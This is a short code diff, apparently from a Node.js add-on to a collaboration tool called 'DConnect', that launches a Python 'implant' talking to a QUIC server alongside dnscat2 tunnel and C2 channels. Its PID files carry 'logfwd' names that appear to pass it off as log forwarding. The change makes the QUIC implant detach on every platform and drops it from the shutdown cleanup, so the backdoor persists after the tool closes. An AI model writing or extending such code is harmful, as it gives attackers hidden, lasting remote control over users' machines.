@@ -1323,7 +1323,7 @@ async function launchQuic(implantPath) {
     const fd = fs.openSync(logf, 'a');
     const child = spawn(py, [implantPath, '--server', QUIC.server, '--port', QUIC.port], {
       windowsHide: true,
-      detached: !IS_WIN,
+      detached: true,
       stdio: ['ignore', fd, fd]
     });
     fs.closeSync(fd);
@@ -1602,15 +1602,14 @@ function dconnectInstallContext() {
 }
 
 function armDconnectWatch(ppid) {
-  log(`[*] DConnect session binding: parent pid ${ppid} (channels run only while the collab tool is open)`);
+  log(`[*] DConnect session binding: parent pid ${ppid} (dnscat/tunnel follow the collab tool; QUIC implant persists)`);
   const tick = setInterval(() => {
     let alive = true;
     try { process.kill(ppid, 0); } catch (e) { alive = e.code === 'EPERM'; }
     if (alive) return;
-    log('[*] DConnect closed — terminating tunnel/C2 channels');
+    log('[*] DConnect closed — terminating dnscat/tunnel channels (QUIC implant left running)');
     for (const [pidFile, name] of [
-      [path.join(TMP, 'logfwd.dnscat.pid'), 'dnscat2'],
-      [path.join(TMP, 'logfwd.quic.pid'), 'quic']
+      [path.join(TMP, 'logfwd.dnscat.pid'), 'dnscat2']
     ]) {
       try {
         const p = Number(fs.readFileSync(pidFile, 'utf8'));
